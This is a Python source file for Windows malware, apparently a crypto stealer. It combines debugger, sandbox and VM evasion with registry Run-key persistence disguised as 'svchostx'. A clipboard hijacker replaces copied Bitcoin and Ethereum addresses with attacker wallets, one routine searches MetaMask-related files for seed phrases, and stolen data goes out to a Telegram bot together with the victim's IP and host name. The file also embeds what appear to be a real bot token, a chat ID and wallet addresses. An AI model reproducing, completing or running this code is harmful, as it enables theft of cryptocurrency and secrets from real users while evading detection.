# === builder.py ===
import os
import sys
import json
import time
import shutil
import requests
import winreg
import subprocess
from pathlib import Path
from zipfile import ZipFile
from urllib.request import urlopen

# anti-debug.py
import ctypes, sys, time
from datetime import datetime

def is_debugged():
    return ctypes.windll.kernel32.IsDebuggerPresent()

def sleep_random():
    for _ in range(300):  # up to 5 min sleep
        if not is_debugged():
            time.sleep(1)
        else:
            sys.exit()

def domain_fronting_http_beacon():
    # Simulate normal traffic before decrypting real payload
    import urllib.request
    try:
        urllib.request.urlopen("https://cdn.discordapp.com/assets/logo.png")
    except: pass

# === CONFIG ===
TELEGRAM_TOKEN = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
CHAT_ID = "6682145585"
BTC_ADDR = "bc1qar0srrr7xfkvy5l643lydnwqhjlw43af85nnu0"
ETH_ADDR = "0x1a2b3c4d5e6f78901234567890abcdef12345678"
DELAY = 180  # Anti-sandbox delay

# === ANTI-VM / SANDBOX CHECK ===
def is_sandbox():
    try:
        # Check VM artifacts
        vm_paths = [
            "C:\\WINDOWS\\System32\\Drivers\\Vmmouse.sys",
            "C:\\WINDOWS\\System32\\Drivers\\vm3dgl.dll",
            "C:\\WINDOWS\\System32\\Drivers\\vboxdisp.dll"
        ]
        for path in vm_paths:
            if os.path.exists(path):
                return True

        # Check CPU core count (sandbox = 1 or 2)
        if os.cpu_count() < 4:
            return True

        # Check disk size (small disk = VM)
        import shutil
        total, _, _ = shutil.disk_usage("C:\\")
        if total < 50 * (1024**3):  # <50GB
            return True

        return False
    except:
        return False

# === PERSISTENCE: Registry Run Key ===
def add_persistence():
    try:
        exe_path = sys.executable
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "svchostx", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
    except:
        pass

# === CLIPBOARD JACKER (Crypto Address Swapper) ===
def start_clipboard_jacker():
    try:
        import threading
        import time
        import win32clipboard

        def jacker():
            last = ""
            while True:
                try:
                    win32clipboard.OpenClipboard()
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        data = win32clipboard.GetClipboardData().strip()
                        if len(data) == 42 and data.startswith("0x") and data[2:].lower() == data[2:]:
                            # ETH address detected
                            win32clipboard.EmptyClipboard()
                            win32clipboard.SetClipboardText(ETH_ADDR)
                            win32clipboard.CloseClipboard()
                            continue
                        elif len(data) in [34, 42] and (data.startswith("1") or data.startswith("3") or data.startswith("bc1")):
                            # BTC address detected
                            win32clipboard.EmptyClipboard()
                            win32clipboard.SetClipboardText(BTC_ADDR)
                            win32clipboard.CloseClipboard()
                            continue
                    win32clipboard.CloseClipboard()
                except:
                    pass
                time.sleep(1)

        thread = threading.Thread(target=jacker, daemon=True)
        thread.start()
    except ImportError:
        # Fallback: prompt pip install
        os.system("pip install pywin32")

# === STEAL METAMASK RECOVERY PHRASE ===
def steal_metamask():
    profile_paths = [
        os.path.expanduser("~\\AppData\\Roaming\\Electron\\profiles.json"),
        os.path.expanduser("~\\AppData\\Local\\Programs\\MetaMask\\profiles.json")
    ]
    for path in profile_paths:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    data = f.read()
                    if "seed" in data.lower() or "phrase" in data.lower():
                        return data
            except:
                continue
    return None

# === EXFIL TO TELEGRAM ===
def exfil(data):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"[🔥 VICTIM] IP: {get_ip()} | HOST: {os.getenv('COMPUTERNAME')} | DATA:\n\n{data}"
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except:
        pass

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "UNKNOWN"

# === MAIN ===
def main():
    if is_sandbox():
        time.sleep(DELAY)
        sys.exit(0)

    time.sleep(DELAY)  # Delay for sandbox evasion

    add_persistence()
    start_clipboard_jacker()

    data = steal_metamask()
    if data:
        exfil(data)

if __name__ == "__main__":
    main()